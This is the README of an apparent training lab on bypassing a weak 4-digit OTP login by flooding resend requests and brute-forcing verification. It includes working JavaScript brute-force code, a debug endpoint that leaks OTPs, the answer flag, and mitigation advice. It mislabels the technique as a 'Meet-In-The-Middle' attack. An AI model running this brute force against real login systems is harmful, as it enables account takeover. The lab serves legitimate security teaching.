# 🔐 MFA Bypass Lab - Meet-In-The-Middle Attack

**Educational Security Testing Environment**

This lab demonstrates a critical vulnerability in Multi-Factor Authentication (MFA) implementations: **lack of rate limiting** and **brute-force protection**.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Vulnerability Description](#vulnerability-description)
- [Lab Setup](#lab-setup)
- [Challenge Instructions](#challenge-instructions)
- [Attack Methods](#attack-methods)
- [Solution](#solution)
- [Mitigation Strategies](#mitigation-strategies)

---

## 🎯 Overview

This lab simulates a vulnerable web application with a two-factor authentication system that has **no rate limiting**. Students will learn how to exploit this vulnerability using a **Meet-In-The-Middle (MITM) attack**.

**Learning Objectives:**
- Understand how weak MFA implementations can be bypassed
- Learn about Meet-In-The-Middle attacks
- Practice ethical hacking techniques
- Understand proper security controls for MFA

---

## 🔍 Vulnerability Description

### The Vulnerability

The application has multiple security weaknesses:

1. **Weak OTP**: Only 4 digits (10,000 possible combinations)
2. **No Rate Limiting**: Unlimited verification attempts
3. **No Resend Throttling**: Unlimited OTP generation requests
4. **Multiple Valid OTPs**: System allows multiple OTPs to be valid simultaneously
5. **Long Expiration Time**: 5-minute validity window

### Meet-In-The-Middle Attack

This attack works by:
1. **Continuously requesting new OTPs** (flooding the valid OTP pool)
2. **Simultaneously brute-forcing OTP values** (trying all possible combinations)
3. Eventually, a guessed OTP will match one of the many valid OTPs in the pool

**Why it works:** Instead of trying to guess 1 specific OTP out of 10,000, you're trying to guess ANY of the 50-100+ valid OTPs in the pool at any given time.

---

## 🚀 Lab Setup

### Prerequisites

- Docker and Docker Compose installed
- Python 3.x (for exploit script)
- Basic understanding of web security

### Installation

1. **Clone or extract the lab files:**
```bash
cd mfa-bypass-lab
```

2. **Build and run the Docker container:**
```bash
docker-compose up --build
```

3. **Access the application:**
Open your browser and navigate to:
```
http://localhost:5000
```

4. **To stop the lab:**
```bash
docker-compose down
```

---

## 🎓 Challenge Instructions

### Credentials

- **Username:** `student`
- **Password:** `password123`

### Objective

1. Login with the provided credentials
2. Bypass the MFA verification page
3. Retrieve the FLAG from the dashboard

### Success Criteria

You successfully complete the lab when you see the FLAG on the dashboard.

---

## 🛠️ Attack Methods

### Method 1: Manual Attack (Educational)

1. Login with credentials
2. Open browser developer tools (F12)
3. Go to the Console tab
4. Use the following JavaScript to spam OTP requests:

```javascript
// Request 50 OTPs
for(let i = 0; i < 50; i++) {
    fetch('/resend_otp', {method: 'POST'});
}
```

5. Check active OTPs (optional):
```javascript
fetch('/debug/otps').then(r => r.json()).then(d => console.log(d));
```

6. Start brute-forcing in the console:
```javascript
async function bruteForceOTP() {
    for(let i = 0; i < 10000; i++) {
        let otp = String(i).padStart(4, '0');
        let response = await fetch('/verify_otp', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: `otp=${otp}`
        });
        let data = await response.json();
        if(data.success) {
            console.log(`SUCCESS! OTP: ${otp}`);
            window.location.href = data.redirect;
            return;
        }
        if(i % 100 == 0) console.log(`Tried ${i} OTPs...`);
    }
}

bruteForceOTP();
```

### Method 2: Automated Exploit Script

The lab includes a Python exploit script that automates the attack.

1. **Install requirements:**
```bash
pip install requests
```

2. **Run the exploit:**
```bash
python3 exploit.py
```

The script will:
- Login automatically
- Spawn multiple threads to request OTPs
- Spawn multiple threads to brute-force OTPs
- Find the valid OTP and display success

### Method 3: Using Burp Suite or Other Tools

1. Use Burp Suite's Intruder
2. Configure two sessions:
   - Session 1: Continuously send POST to `/resend_otp`
   - Session 2: Brute-force POST to `/verify_otp` with OTP values 0000-9999
3. Let it run until you find a valid OTP

---

## ✅ Solution

### Quick Solution

1. Login with `student:password123`
2. Run this in browser console:

```javascript
// Request many OTPs
for(let i = 0; i < 100; i++) fetch('/resend_otp', {method: 'POST'});

// Brute force
(async () => {
    for(let i = 0; i < 10000; i++) {
        let otp = String(i).padStart(4, '0');
        let r = await fetch('/verify_otp', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: `otp=${otp}`
        });
        let d = await r.json();
        if(d.success) {
            console.log(`FOUND: ${otp}`);
            location.href = d.redirect;
            return;
        }
    }
})();
```

### Expected FLAG

```
CTF{MFA_BYPASS_MITM_ATTACK_SUCCESS_2024}
```

---

## 🛡️ Mitigation Strategies

### How to Prevent This Attack

1. **Use Strong OTPs**
   - Minimum 6-8 digits
   - Use alphanumeric OTPs for even stronger security

2. **Implement Rate Limiting**
   - Maximum 3-5 verification attempts per OTP
   - Lock account temporarily after failed attempts
   - Progressive delays between attempts

3. **Throttle Resend Requests**
   - Allow only 1 resend request per 30-60 seconds
   - Limit total resends per session (e.g., max 3)

4. **Invalidate Previous OTPs**
   - Only ONE OTP should be valid at any time
   - Generating a new OTP should invalidate all previous ones

5. **Short Expiration Time**
   - 30-90 seconds validity window
   - Shorter window = smaller attack surface

6. **Account Lockout**
   - Temporary account lock after 5 failed MFA attempts
   - Require additional verification to unlock

7. **Monitor Anomalies**
   - Detect rapid OTP requests
   - Alert on suspicious patterns
   - Implement CAPTCHA for repeated failures

8. **Use Secure MFA Methods**
   - TOTP (Time-based OTP) apps like Google Authenticator
   - Hardware tokens (YubiKey, etc.)
   - Push notifications
   - Biometric verification

### Example Implementation

```python
# Proper rate limiting example
from datetime import datetime, timedelta

MAX_ATTEMPTS = 3
LOCKOUT_TIME = 300  # 5 minutes

failed_attempts = {}

def verify_otp_secure(username, otp):
    # Check if account is locked
    if username in failed_attempts:
        if failed_attempts[username]['count'] >= MAX_ATTEMPTS:
            lockout_until = failed_attempts[username]['locked_until']
            if datetime.now() < lockout_until:
                raise Exception("Account temporarily locked")
            else:
                # Reset after lockout period
                del failed_attempts[username]
    
    # Verify OTP (only ONE valid OTP should exist)
    if verify_single_otp(username, otp):
        # Reset failed attempts on success
        if username in failed_attempts:
            del failed_attempts[username]
        return True
    else:
        # Track failed attempts
        if username not in failed_attempts:
            failed_attempts[username] = {'count': 1}
        else:
            failed_attempts[username]['count'] += 1
        
        # Lock account after max attempts
        if failed_attempts[username]['count'] >= MAX_ATTEMPTS:
            failed_attempts[username]['locked_until'] = \
                datetime.now() + timedelta(seconds=LOCKOUT_TIME)
        
        return False
```

---

## 📚 Additional Resources

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)

---

## ⚠️ Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY**

This lab is designed for educational and training purposes in a controlled environment. Do not use these techniques on systems you do not own or have explicit permission to test.

Unauthorized access to computer systems is illegal and unethical.

---

## 📝 Lab Details

- **Vulnerability Type:** Missing Rate Limiting / Brute-Force Protection
- **Attack Technique:** Meet-In-The-Middle
- **Difficulty:** Beginner to Intermediate
- **Time Required:** 15-30 minutes
- **OWASP Category:** A07:2021 – Identification and Authentication Failures

---

## 🤝 Contributing

This is an educational project. Feel free to:
- Report issues
- Suggest improvements
- Add new attack vectors
- Enhance documentation

---

## 📄 License

This project is for educational purposes. Use responsibly and ethically.

---

**Happy Hacking! 🚀**

Remember: Use these skills to make the internet more secure, not less!
